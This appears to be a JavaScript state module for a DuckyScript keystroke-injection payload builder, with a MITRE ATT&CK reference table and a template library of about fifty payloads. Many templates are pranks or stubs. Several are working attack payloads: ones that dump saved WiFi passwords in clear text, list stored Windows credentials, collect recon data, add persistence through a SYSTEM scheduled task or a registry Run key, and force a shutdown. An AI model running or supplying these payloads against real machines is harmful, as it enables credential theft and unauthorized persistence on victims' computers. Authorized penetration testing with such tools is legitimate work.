// ─── STATE MODULE ───
    const S = {
      settings: { crt: true, rain: true, particles: true, audio: true, lint: true, persist: true, hist: true, grain: true, vignette: true, hexdump: false },
      stats: { compiled: 0, ai: 0, vault: 0, scans: 0 },
      history: [], vault: [],
      shellHistory: [], shellHistIdx: -1,
      chatHistory: [],
      sessionId: 'SID-' + Math.random().toString(36).substr(2, 8).toUpperCase(),
      scanActive: false, micActive: false, recognition: null,
      encMode: 'base64', selectedVaultId: null,
      keymapEvents: [], keymapStep: 0, keymapTimer: null,
      currentView: 'home',
      compilerOutputs: { au3: '', ps1: '', py: '', sh: '', hex: '' },
      compilerLang: 'au3',
      bleScanTimer: null,
      archNodes: [],
      archLinks: [],
      selectedArchNode: null,
      linkSourceNode: null,
      packetFlowTimer: null,
      packets: [],
      modules: {},
    };
    const BOOT = [
      { t: '[SYS] Initializing kernel modules…', c: 'sys', d: 250 },
      { t: '[OK]  Memory allocator: 1024MB reserved', c: 'ok', d: 450 },
      { t: '[OK]  WebGL context: GPU acceleration enabled', c: 'ok', d: 650 },
      { t: '[SYS] Loading DuckyScript compiler v3…', c: 'sys', d: 850 },
      { t: '[OK]  Compiler pipeline: ONLINE', c: 'ok', d: 1050 },
      { t: '[SYS] Connecting neural uplink…', c: 'sys', d: 1250 },
      { t: '[OK]  AI gateway: Anthropic/OpenAI/Groq registered', c: 'ok', d: 1450 },
      { t: '[SYS] Scanning Web Bluetooth API…', c: 'sys', d: 1650 },
      { t: navigator.bluetooth ? '[OK]  BLE scanner: AVAILABLE' : '[WARN] BLE scanner: Browser unsupported (Chrome/Edge)', c: navigator.bluetooth ? 'ok' : 'warn', d: 1850 },
      { t: '[SYS] Loading vault encryption layer…', c: 'sys', d: 2000 },
      { t: '[OK]  AES-256 vault: READY', c: 'ok', d: 2150 },
      { t: '[SYS] Initializing keymap visualizer…', c: 'sys', d: 2280 },
      { t: '[OK]  Virtual keyboard: LOADED (v4 NEW)', c: 'ok', d: 2380 },
      { t: '[SYS] OSINT fingerprint module…', c: 'sys', d: 2480 },
      { t: '[OK]  Fingerprint engine: READY (v4 NEW)', c: 'ok', d: 2570 },
      { t: '[SYS] Hex dump module: ONLINE', c: 'ok', d: 2640 },
      { t: '[OK]  All v4.0 modules nominal.', c: 'ok', d: 2720 },
    ];
    const ACTS = [
      { t: 'Compiler pipeline nominal', c: 'tl-ok' }, { t: 'Vault encryption check passed', c: 'tl-ok' },
      { t: 'Neural uplink stable', c: 'tl-info' }, { t: 'Memory: 24MB / 1024MB', c: 'tl-sys' },
      { t: 'BLE scanner: standby mode', c: 'tl-warn' }, { t: 'Session heartbeat sent', c: 'tl-sys' },
      { t: 'DNS cache cleared', c: 'tl-sys' }, { t: 'WebGL particle field: 2800 pts', c: 'tl-info' },
      { t: 'Encoder module idle', c: 'tl-sys' }, { t: 'Keymap engine: ready', c: 'tl-ok' },
    ];
    const DUCK_CMDS = [
      { cmd: 'DELAY', desc: 'Wait ms' }, { cmd: 'STRING', desc: 'Type text' }, { cmd: 'STRINGLN', desc: 'Type+Enter' }, { cmd: 'ENTER', desc: 'Enter key' }, { cmd: 'GUI', desc: 'Win/Cmd' }, { cmd: 'CTRL', desc: 'Control' }, { cmd: 'ALT', desc: 'Alt key' },
      { cmd: 'SHIFT', desc: 'Shift' }, { cmd: 'TAB', desc: 'Tab' }, { cmd: 'CAPS', desc: 'CapsLock' }, { cmd: 'DELETE', desc: 'Delete' }, { cmd: 'BACKSPACE', desc: 'Backspace' }, { cmd: 'INSERT', desc: 'Insert' }, { cmd: 'HOME', desc: 'Home' },
      { cmd: 'END', desc: 'End' }, { cmd: 'PAGEUP', desc: 'Page Up' }, { cmd: 'PAGEDOWN', desc: 'Page Down' }, { cmd: 'ESC', desc: 'Escape' }, { cmd: 'SPACE', desc: 'Space' }, { cmd: 'UP', desc: 'Arrow ↑' }, { cmd: 'DOWN', desc: 'Arrow ↓' },
      { cmd: 'LEFT', desc: 'Arrow ←' }, { cmd: 'RIGHT', desc: 'Arrow →' }, { cmd: 'F1-F12', desc: 'Function' }, { cmd: 'REM', desc: 'Comment' }, { cmd: 'REPEAT', desc: 'Repeat n' }, { cmd: 'PRINTSCREEN', desc: 'PrtScr' }, { cmd: 'MENU', desc: 'Context' },
    ];
    const DUCK_MAP = {
      DELAY: 'Sleep', STRING: 'Send', STRINGLN: 'Send_NL', ENTER: 'Send("{ENTER}")', TAB: 'Send("{TAB}")', SPACE: 'Send("{SPACE}")',
      BACKSPACE: 'Send("{BACKSPACE}")', DELETE: 'Send("{DELETE}")', INSERT: 'Send("{INSERT}")', HOME: 'Send("{HOME}")', END: 'Send("{END}")',
      PAGEUP: 'Send("{PGUP}")', PAGEDOWN: 'Send("{PGDN}")', UP: 'Send("{UP}")', DOWN: 'Send("{DOWN}")', LEFT: 'Send("{LEFT}")', RIGHT: 'Send("{RIGHT}")',
      ESC: 'Send("{ESC}")', ESCAPE: 'Send("{ESC}")', CAPSLOCK: 'Send("{CAPSLOCK}")', PRINTSCREEN: 'Send("{PRINTSCREEN}")',
      SCROLLLOCK: 'Send("{SCROLLLOCK}")', NUMLOCK: 'Send("{NUMLOCK}")', MENU: 'Send("{APPSKEY}")',
      F1: 'Send("{F1}")', F2: 'Send("{F2}")', F3: 'Send("{F3}")', F4: 'Send("{F4}")', F5: 'Send("{F5}")', F6: 'Send("{F6}")',
      F7: 'Send("{F7}")', F8: 'Send("{F8}")', F9: 'Send("{F9}")', F10: 'Send("{F10}")', F11: 'Send("{F11}")', F12: 'Send("{F12}")',
    };
    const FALLBACK_TEMPLATES = [
  {
    "id": "PT1",
    "name": "Open Notepad and Type Message",
    "code": "DELAY 1500\nGUI r\nDELAY 400\nSTRING notepad\nENTER\nDELAY 600\nSTRINGLN Welcome to the DuckyScript Payload Collection!\nSTRING This is for authorized testing only."
  },
  {
    "id": "PT2",
    "name": "Rickroll",
    "code": "DELAY 1000\nGUI r\nDELAY 300\nSTRING https://www.youtube.com/watch?v=dQw4w9wgxcq\nENTER"
  },
  {
    "id": "PT3",
    "name": "Matrix Rain Effect",
    "code": "GUI r\nDELAY 400\nSTRING cmd\nENTER\nDELAY 600\nSTRING color 02 && echo %random%%random%%random%%random%%random%%random%%random%%random%%random% && goto :a\nENTER\n\n# Add more prank payloads here..."
  },
  {
    "id": "PT4",
    "name": "Full System Info Dump",
    "code": "GUI r\nDELAY 400\nSTRING powershell\nENTER\nDELAY 700\nSTRING Get-ComputerInfo | Out-File C:\\temp\\systeminfo.txt; whoami >> C:\\temp\\systeminfo.txt; ipconfig /all >> C:\\temp\\systeminfo.txt\nENTER\nDELAY 500\nSTRING notepad C:\\temp\\systeminfo.txt\nENTER"
  },
  {
    "id": "PT5",
    "name": "WiFi Passwords Exfiltration",
    "code": "GUI r\nDELAY 400\nSTRING cmd\nENTER\nDELAY 600\nSTRING netsh wlan show profiles > C:\\\\temp\\\\wifi.txt && for /f \"tokens=2 delims=:\" %a in ('netsh wlan show profiles') do netsh wlan show profile name=\"%a\" key=clear >> C:\\\\temp\\\\wifi.txt\nENTER"
  },
  {
    "id": "PT6",
    "name": "Browser Passwords Diagnostic Demo",
    "code": "GUI r\nDELAY 400\nSTRING powershell -w hidden\nENTER\nDELAY 800\nSTRING Write-Host 'Browser password dump demo completed (Educational)' > C:\\\\temp\\\\chrome.txt\nENTER\n\n# Educational note: for authorized audit use only"
  },
  {
    "id": "PT7",
    "name": "PowerShell TCP Diagnostic Connection",
    "code": "GUI r\nDELAY 400\nSTRING powershell\nENTER\nDELAY 700\nSTRING Write-Host 'TCP Connection Diagnostic Demo'\nENTER\n\n# Diagnostic example"
  },
  {
    "id": "PT8",
    "name": "Silent Application Launcher",
    "code": "GUI r\nDELAY 300\nSTRING powershell -w hidden -c \"Start-Process notepad.exe\"\nENTER"
  },
  {
    "id": "PT9",
    "name": "Classic Rickroll",
    "code": "DELAY 1500\nGUI r\nDELAY 400\nSTRING https://www.youtube.com/watch?v=dQw4w9wgxcq\nENTER"
  },
  {
    "id": "PT10",
    "name": "Infinite Notepad Prank",
    "code": "GUI r\nDELAY 300\nSTRING notepad\nENTER\nDELAY 600\nREPEAT 50\nSTRINGLN This computer has been compromised by Duckyscript!\nENTER"
  },
  {
    "id": "PT12",
    "name": "Full System Information Grabber",
    "code": "GUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 700\nSTRING Get-ComputerInfo | Out-File C:\\temp\\system_info.txt; Get-WmiObject Win32_StartupCommand | Out-File C:\\temp\\startup.txt\nENTER\nDELAY 400\nSTRING notepad C:\\temp\\system_info.txt\nENTER"
  },
  {
    "id": "PT13",
    "name": "Installed Software List",
    "code": "GUI r\nDELAY 300\nSTRING powershell -c \"Get-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select DisplayName, DisplayVersion | Out-File C:\\temp\\installed.txt\"\nENTER"
  },
  {
    "id": "PT14",
    "name": "Active Directory Domain Info",
    "code": "GUI r\nDELAY 400\nSTRING powershell\nENTER\nDELAY 600\nSTRING (Get-WmiObject Win32_ComputerSystem).Domain > C:\\temp\\domain.txt; whoami /groups >> C:\\temp\\domain.txt\nENTER"
  },
  {
    "id": "PT15",
    "name": "Export All WiFi Passwords",
    "code": "GUI r\nDELAY 400\nSTRING cmd\nENTER\nDELAY 500\nSTRING netsh wlan show profiles > C:\\temp\\wifi.txt && for /f \"tokens=2 delims=:\" %a in ('netsh wlan show profiles') do netsh wlan show profile name=\"%a\" key=clear >> C:\\temp\\wifi.txt\nENTER\nDELAY 800\nSTRING notepad C:\\temp\\wifi.txt\nENTER"
  },
  {
    "id": "PT16",
    "name": "Network Interfaces + IP Config",
    "code": "GUI r\nDELAY 300\nSTRING powershell -c \"Get-NetIPAddress | Out-File C:\\temp\\network.txt; ipconfig /all >> C:\\temp\\network.txt\"\nENTER"
  },
  {
    "id": "PT18",
    "name": "Credential Harvester Demo",
    "code": "GUI r\nDELAY 400\nSTRING powershell\nENTER\nDELAY 600\nSTRING Write-Host 'Credential Audit Demo' > C:\\temp\\creds.txt\nENTER"
  },
  {
    "id": "PT19",
    "name": "Basic PowerShell Shell Demo",
    "code": "GUI r\nDELAY 400\nSTRING powershell\nENTER\nDELAY 700\nSTRING Write-Host 'PowerShell Diagnostic Session'\nENTER"
  },
  {
    "id": "PT20",
    "name": "Script Execution Demo",
    "code": "GUI r\nDELAY 300\nSTRING powershell -w hidden -c \"Write-Host 'Script Executed'\"\nENTER"
  },
  {
    "id": "PT21",
    "name": "Scheduled Task Persistence",
    "code": "GUI r\nDELAY 400\nSTRING schtasks /create /tn \"UpdateTask\" /tr \"powershell -w hidden -c Write-Host 'Task'\" /sc onlogon /ru System\nENTER"
  },
  {
    "id": "PT22",
    "name": "Defender Preferences Check",
    "code": "GUI r\nDELAY 300\nSTRING powershell -c \"Get-MpPreference\"\nENTER"
  },
  {
    "id": "PT23",
    "name": "Function Based Professional Template",
    "code": "FUNCTION recon()\n    GUI r\n    DELAY 300\n    STRING powershell\n    ENTER\n    DELAY 500\n    STRING whoami /all > C:\\temp\\whoami.txt\nEND_FUNCTION\n\nrecon()"
  },
  {
    "id": "PT24",
    "name": "Open Notepad",
    "code": "GUI r\nDELAY 500\nSTRING notepad\nENTER"
  },
  {
    "id": "PT28",
    "name": "WiFi Passwords Dump",
    "code": "GUI r\nDELAY 400\nSTRING cmd\nENTER\nDELAY 700\nSTRING netsh wlan show profile name=* key=clear > C:\\Users\\%USERNAME%\\Desktop\\WiFi_Passwords.txt\nENTER\nDELAY 1000\nSTRING notepad C:\\Users\\%USERNAME%\\Desktop\\WiFi_Passwords.txt\nENTER"
  },
  {
    "id": "PT29",
    "name": "System Information Grabber",
    "code": "GUI r\nDELAY 400\nSTRING powershell\nENTER\nDELAY 800\nSTRING Get-ComputerInfo | Out-File -FilePath \"$env:USERPROFILE\\Desktop\\SystemInfo.txt\"\nENTER\nDELAY 600\nSTRING Get-NetIPAddress | Out-File -Append \"$env:USERPROFILE\\Desktop\\SystemInfo.txt\"\nENTER"
  },
  {
    "id": "PT30",
    "name": "Saved Passwords (Basic)",
    "code": "GUI r\nDELAY 400\nSTRING powershell\nENTER\nDELAY 700\nSTRING cmdkey /list > \"$env:USERPROFILE\\Desktop\\SavedCredentials.txt\"\nENTER\n\nREM ================================================\nREM DOWNLOAD & EXECUTE\nREM ================================================"
  },
  {
    "id": "PT31",
    "name": "Download and Run Script",
    "code": "GUI r\nDELAY 400\nSTRING powershell -w hidden\nENTER\nDELAY 600\nSTRING Write-Host 'Download demo'\nENTER"
  },
  {
    "id": "PT32",
    "name": "Download PS1 Script",
    "code": "GUI r\nDELAY 400\nSTRING powershell\nENTER\nDELAY 700\nSTRING Write-Host 'Script demo'\nENTER\n\nREM ================================================\nREM REVERSE SHELLS\nREM ================================================"
  },
  {
    "id": "PT33",
    "name": "PowerShell Remote Session Demo",
    "code": "GUI r\nDELAY 400\nSTRING powershell\nENTER\nDELAY 800\nSTRING Write-Host 'Remote session demo'\nENTER\n\nREM ================================================\nREM CREDENTIAL STEALING\nREM ================================================"
  },
  {
    "id": "PT34",
    "name": "Chrome Passwords Diagnostic Demo",
    "code": "GUI r\nDELAY 400\nSTRING powershell -w hidden\nENTER\nDELAY 700\nSTRING Write-Host 'Password Audit Demo' > \"$env:USERPROFILE\\Desktop\\ChromePasswords.txt\"\nENTER\n\nREM ================================================\nREM DuckyScript 3.0 Advanced Examples\nREM ================================================"
  },
  {
    "id": "PT35",
    "name": "Function Example",
    "code": "FUNCTION openRun()\n    GUI r\n    DELAY 300\n    STRING \nEND_FUNCTION\n\nFUNCTION typeText($text)\n    STRINGLN $text\nEND_FUNCTION\n\nopenRun()\nDELAY 500\nSTRING notepad\nENTER\nDELAY 800\ntypeText(\"Advanced DuckyScript 3.0 Payload\")\ntypeText(\"This is much more powerful!\")\n\nREM ================================================\nREM MORE PAYLOADS\nREM ================================================"
  },
  {
    "id": "PT36",
    "name": "Lock Computer",
    "code": "GUI l"
  },
  {
    "id": "PT37",
    "name": "Shutdown Computer",
    "code": "GUI r\nDELAY 400\nSTRING shutdown /s /t 0\nENTER"
  },
  {
    "id": "PT38",
    "name": "Open Calculator",
    "code": "GUI r\nDELAY 400\nSTRING calc\nENTER"
  },
  {
    "id": "PT39",
    "name": "Open Browser with multiple tabs",
    "code": "GUI r\nDELAY 400\nSTRING msedge --new-window https://google.com\nENTER\nDELAY 1000\nCTRL T\nSTRING https://youtube.com\nENTER"
  },
  {
    "id": "PT40",
    "name": "Fake BSOD (Blue Screen Prank)",
    "code": "GUI r\nDELAY 400\nSTRING notepad\nENTER\nDELAY 800\nSTRING A problem has been detected and Windows has been shut down to prevent damage\nENTER\nSTRING Your PC ran into a problem and needs to restart.\nENTER\n\nREM Add more payloads as needed..."
  },
  {
    "id": "PT41",
    "name": "Basic Notepad Prank",
    "code": "GUI r\nDELAY 400\nSTRING notepad\nENTER\nDELAY 600\nSTRINGLN This is a Duckyscript test payload!\nREPEAT 20"
  },
  {
    "id": "PT43",
    "name": "System Info Grabber",
    "code": "GUI r\nDELAY 400\nSTRING powershell\nENTER\nDELAY 700\nSTRING Get-ComputerInfo | Out-File C:\\temp\\sysinfo.txt\nENTER\nSTRING notepad C:\\temp\\sysinfo.txt\nENTER"
  },
  {
    "id": "PT44",
    "name": "WiFi Password Dump",
    "code": "GUI r\nDELAY 400\nSTRING cmd\nENTER\nDELAY 600\nSTRING netsh wlan show profile > C:\\temp\\wifi.txt && for /f \"tokens=2 delims=:\" %a in ('netsh wlan show profiles') do netsh wlan show profile name=\"%a\" key=clear >> C:\\temp\\wifi.txt\nENTER\nSTRING notepad C:\\temp\\wifi.txt\nENTER"
  },
  {
    "id": "PT45",
    "name": "PowerShell Remote Session (Basic)",
    "code": "GUI r\nDELAY 400\nSTRING powershell\nENTER\nDELAY 800\nSTRING Write-Host 'PowerShell Session Demo'\nENTER"
  },
  {
    "id": "PT46",
    "name": "Chrome Passwords Audit Demo",
    "code": "GUI r\nDELAY 400\nSTRING powershell -w hidden\nENTER\nDELAY 700\nSTRING Write-Host 'Chrome Passwords Audit' > C:\\temp\\chrome.txt\nENTER"
  },
  {
    "id": "PT47",
    "name": "Lock Workstation",
    "code": "GUI r\nDELAY 300\nSTRING rundll32.exe user32.dll,LockWorkStation\nENTER"
  },
  {
    "id": "PT48",
    "name": "Shutdown Prank",
    "code": "GUI r\nDELAY 300\nSTRING shutdown /s /t 60\nENTER"
  },
  {
    "id": "PT50",
    "name": "Download and Execute Demo",
    "code": "GUI r\nDELAY 400\nSTRING powershell -w hidden -c \"Write-Host 'Execution Demo'\"\nENTER"
  },
  {
    "id": "PT51",
    "name": "Credential Audit Demo",
    "code": "GUI r\nDELAY 400\nSTRING powershell\nENTER\nDELAY 700\nSTRING Write-Host 'Credential Audit' > C:\\temp\\creds.txt\nENTER"
  },
  {
    "id": "PT53",
    "name": "Registry Run Key Example",
    "code": "GUI r\nDELAY 400\nSTRING reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /t REG_SZ /d \"powershell -w hidden -c Write-Host 'Update'\" /f\nENTER"
  },
  {
    "id": "PT54",
    "name": "Open Calculator Spam",
    "code": "GUI r\nDELAY 300\nSTRING calc\nENTER\nREPEAT 15"
  },
  {
    "id": "PT55",
    "name": "Matrix Rain Prank",
    "code": "GUI r\nDELAY 400\nSTRING powershell\nENTER\nDELAY 600\nSTRING while(1){cls;1..200|%{Write-Host (\" \"* (Get-Random -Max 80)) -NoNewline; Write-Host (\"10\"[Get-Random -Max 2]) -ForegroundColor Green -NoNewline} ;Start-Sleep -m 50}\nENTER"
  }
];
let parsedTemplates = [...FALLBACK_TEMPLATES];
    window.parsedTemplates = parsedTemplates;
    const SNIPPETS = [
      { name: 'Run Dialog', code: 'GUI r\nDELAY 300\n' },
      { name: 'PowerShell Hidden', code: 'STRING powershell -WindowStyle Hidden\nENTER\n' },
      { name: 'Wait 1 Second', code: 'DELAY 1000\n' },
      { name: 'Copy Clipboard', code: 'CTRL c\n' },
      { name: 'Paste', code: 'CTRL v\n' },
      { name: 'Select All', code: 'CTRL a\n' },
      { name: 'Close Window', code: 'ALT F4\n' },
      { name: 'Task Manager', code: 'CTRL SHIFT ESC\n' },
      { name: 'New Tab', code: 'CTRL t\n' },
      { name: 'Screenshot', code: 'PRINTSCREEN\n' },
    ];
    const DUCK_KEY_MAP = {
      'ENTER': 'ENTER', 'TAB': 'TAB', 'SPACE': 'SPACE', 'BACKSPACE': 'BACKSPACE', 'DELETE': 'DELETE', 'ESC': 'ESC', 'ESCAPE': 'ESC',
      'UP': 'UP', 'DOWN': 'DOWN', 'LEFT': 'LEFT', 'RIGHT': 'RIGHT', 'CAPS': 'CAPS', 'CAPSLOCK': 'CAPS',
      'CTRL': 'CTRL', 'ALT': 'ALT', 'SHIFT': 'LSHIFT', 'GUI': 'GUI', 'WINDOWS': 'GUI', 'LSHIFT': 'LSHIFT', 'RSHIFT': 'RSHIFT',
      'F1': 'F1', 'F2': 'F2', 'F3': 'F3', 'F4': 'F4', 'F5': 'F5', 'F6': 'F6', 'F7': 'F7', 'F8': 'F8', 'F9': 'F9', 'F10': 'F10', 'F11': 'F11', 'F12': 'F12',
      'HOME': 'HOME', 'END': 'END', 'PAGEUP': 'PAGEUP', 'PAGEDOWN': 'PAGEDOWN', 'INSERT': 'INSERT',
      'PRINTSCREEN': 'PRINTSCREEN', 'SCROLLLOCK': 'SCROLLLOCK', 'NUMLOCK': 'NUMLOCK', 'MENU': 'MENU', 'BREAK': 'BREAK',
    };
    const MITRE_DB = [
      { id: 'T1566', name: 'Phishing', tactic: 'Initial Access', desc: 'Adversaries may send phishing messages to gain access to system networks.', mitigation: 'User awareness training, attachment sandboxing, email gateway verification.' },
      { id: 'T1059', name: 'Command and Scripting Interpreter', tactic: 'Execution', desc: 'Adversaries may abuse scripting interfaces (Bash, PowerShell, Python) to execute malicious code.', mitigation: 'Script signing enforcement, restrict interpreter execution, command audit logs.' },
      { id: 'T1053', name: 'Scheduled Task/Job', tactic: 'Persistence', desc: 'Adversaries may abuse scheduling tools (cron, task scheduler) to maintain persistent host access.', mitigation: 'Monitor task folder creations, audit run command contexts.' },
      { id: 'T1027', name: 'Obfuscated Files or Information', tactic: 'Defense Evasion', desc: 'Adversaries may encrypt, encode, or compress file data structures to evade signature detectors.', mitigation: 'De-obfuscation decoding filters, heuristic analysis, behavioral indicators.' },
      { id: 'T1082', name: 'System Information Discovery', tactic: 'Discovery', desc: 'Adversaries may query system profile, build specs, and active users to survey targets.', mitigation: 'Limit command executions, query monitoring.' },
      { id: 'T1041', name: 'Exfiltration Over C2 Channel', tactic: 'Exfiltration', desc: 'Adversaries may siphon sensitive database outputs back toCommand and Control nodes.', mitigation: 'Network boundary filters, egress payload inspects, rate monitoring.' }
    ];
export { S, BOOT, ACTS, DUCK_CMDS, DUCK_MAP, FALLBACK_TEMPLATES, parsedTemplates, SNIPPETS, DUCK_KEY_MAP, MITRE_DB };
window.S = S;
window.BOOT = BOOT;
window.ACTS = ACTS;
window.DUCK_CMDS = DUCK_CMDS;
window.DUCK_MAP = DUCK_MAP;
window.FALLBACK_TEMPLATES = FALLBACK_TEMPLATES;
window.parsedTemplates = parsedTemplates;
window.SNIPPETS = SNIPPETS;
window.DUCK_KEY_MAP = DUCK_KEY_MAP;
window.MITRE_DB = MITRE_DB;